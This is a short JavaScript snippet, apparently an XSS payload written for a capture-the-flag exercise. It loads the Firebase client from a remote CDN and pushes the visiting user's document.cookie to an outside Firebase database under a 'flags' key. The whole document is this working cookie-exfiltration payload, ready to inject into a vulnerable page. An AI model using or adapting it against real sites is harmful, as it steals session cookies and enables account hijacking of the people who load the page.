var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'http://cdn.firebase.com:80/js/client/2.4.0/firebase.js';
document.head.appendChild(script);


var myFirebaseRef = new Firebase("http://przno-test.firebaseio.com:80/");
var flags = myFirebaseRef.child("flags");
flags.push().set({flag: document.cookie})
